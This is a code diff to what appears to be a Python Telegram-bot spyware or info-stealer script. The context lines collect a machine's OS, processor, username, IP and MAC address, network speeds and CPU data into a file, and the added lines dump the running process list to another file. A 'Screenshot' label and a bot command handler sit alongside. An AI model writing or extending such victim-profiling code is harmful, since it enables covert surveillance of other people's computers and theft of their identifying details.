@@ -98,6 +98,9 @@ except OSError:
 file = open("info.txt", "w")
 file.write(f"[================================================]\\n  Operating System: {ost.system}\\n  Processor: {ost.processor}\\n  Username: {name}\\n  IP adress: {ip}\\n  MAC adress: {mac}\\n  Timezone: {time.year}/{time.month}/{time.day} {time.hour}:{time.minute}:{time.second}\\n  Work speed: {workspeed}\\n  Download: {download} MB/s\\n  Upload: {uploads} MB/s\\n  Max Frequency: {cpu.max:.2f} Mhz\\n  Min Frequency: {cpu.min:.2f} Mhz\\n  Current Frequency: {cpu.current:.2f} Mhz\\n[================================================]\\n")
 file.close()
+ride = open("process.txt", "w", encoding="utf-8")
+ride.write(' '.join(process))
+ride.close()
 text = "Screenshot"
 @bot.message_handler(commands=["start"])
 def start_message(message):
